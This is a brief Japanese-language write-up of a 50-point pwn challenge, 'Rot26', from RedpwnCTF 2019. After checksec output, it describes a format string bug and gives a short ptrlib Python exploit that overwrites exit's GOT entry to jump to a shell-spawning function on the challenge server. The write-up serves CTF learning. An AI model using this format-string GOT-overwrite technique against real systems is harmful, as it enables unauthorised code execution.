# [pwn 50pts] Rot26 - RedpwnCTF 2019
32ビットでNX以外無効です。
```
$ checksec -f rot26
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   78 Symbols     No       0               4       rot26
```
FSBがあります。
また、シェルを起動してくれる`winners_room`関数があるので、exitのGOTを書き換えてそこに飛ばせばOKです。
```python
from ptrlib import *

elf = ELF("./rot26")
sock = Socket("chall2.2019.redpwn.net", 4003)

writes = {
    elf.got("exit"): elf.symbol("winners_room")
}
payload = fsb(
    writes = writes,
    pos = 7,
    bs = 1,
    bits = 32
)
print(payload)
sock.sendline(payload)

sock.interactive()
```

# 感想
簡単ですね。